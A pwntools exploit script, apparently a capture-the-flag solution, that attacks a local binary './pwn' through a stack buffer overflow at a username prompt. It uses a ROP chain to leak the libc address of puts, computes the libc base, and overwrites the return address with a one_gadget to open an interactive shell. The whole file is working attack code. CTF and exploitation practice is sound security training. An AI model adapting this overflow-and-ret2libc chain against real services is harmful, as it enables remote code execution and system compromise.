from pwn import *

context.log_level = "debug"
context(arch="amd64", os="linux")
context.terminal = ["tmux", "splitw", "-h"]


def p(s, m):
    if m == 0:
        io = process(s)
    else:
        if ":" in s:
            x = s.split(":")
            addr = x[0]
            port = int(x[1])
            io = remote(addr, port)
        elif " " in s:
            x = s.split(" ")
            addr = x[0]
            port = int(x[1])
            io = remote(addr, port)
        else:
            error(f"{s} may be some error")
    return io


def gg():
    gdb.attach(io)
    raw_input()


s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sla = lambda x, y: io.sendlineafter(x, y)
sl = lambda x: io.sendline(x)
rv = lambda x: io.recv(x)
ru = lambda x: io.recvuntil(x)
rvl = lambda: io.recvline()
lg = lambda x, y: log.info(f"\x1b[01;38;5;214m {x} => {hex(y)} \x1b[0m")
ia = lambda: io.interactive()
uu32 = lambda x: u32(x.ljust(4, b"\x00"))
uu64 = lambda x: u64(x.ljust(8, b"\x00"))
l32 = lambda: u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))


io = p("./pwn", 0)
# io = p("127.0.0.1:1337", 1)

proc = ELF("./pwn")

libc = ELF("./libc.so.6")

pop_rdi_ret = 0x401393

puts_addr = 0x401090

puts_plt = 0x404018

main_addr = 0x40123B

payload = (
    b"a" * 0x70
    + p64(0x404200)
    + p64(pop_rdi_ret)
    + p64(puts_plt)
    + p64(puts_addr)
    + p64(main_addr)
)

sla(b"username: \n", payload)

sla(b"password: ", b"123")

puts_value = l64()

lg("puts addr", puts_value)

libc_base_addr = puts_value - libc.sym["puts"]

lg("libc base addr", libc_base_addr)

system_addr = libc_base_addr + libc.sym["system"]

ones = [0xE3AFE, 0xE3B01, 0xE3B04]

one_addr = puts_value - libc.sym["puts"] + ones[1]

lg("system addr", system_addr)

payload = b"a" * 0x70 + p64(0x404200) + p64(one_addr)

sla(b"username: \n", payload)

sla(b"password: ", b"123")

ia()
